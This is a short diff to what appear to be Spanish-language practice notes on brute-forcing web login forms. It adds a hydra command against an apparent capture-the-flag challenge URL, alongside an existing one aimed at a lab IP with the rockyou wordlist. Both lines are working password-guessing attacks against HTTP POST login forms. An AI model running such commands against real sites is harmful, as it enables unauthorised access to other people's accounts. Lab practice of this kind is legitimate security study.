@@ -1,2 +1,4 @@
 # Fuerza bruta a formulario POST
 hydra 192.168.56.101 http-form-post "/?page=login:user=^USER^&pass=^PASS^&submit=Login:failed" -P /usr/share/wordlists/rockyou.txt -L /usr/share/wordlists/users.txt -v -V -w 30 -t 10
+
+hydra portal.hackazon.org https-form-post "/challenge/703456cb0e2d4c4f602bf2dfe690c0d5/bank_admin:username=^USER^&password=^PASS^:Incorrect username" -p f.txt -L trueusernames.txt -v -V -w 30 -t 10
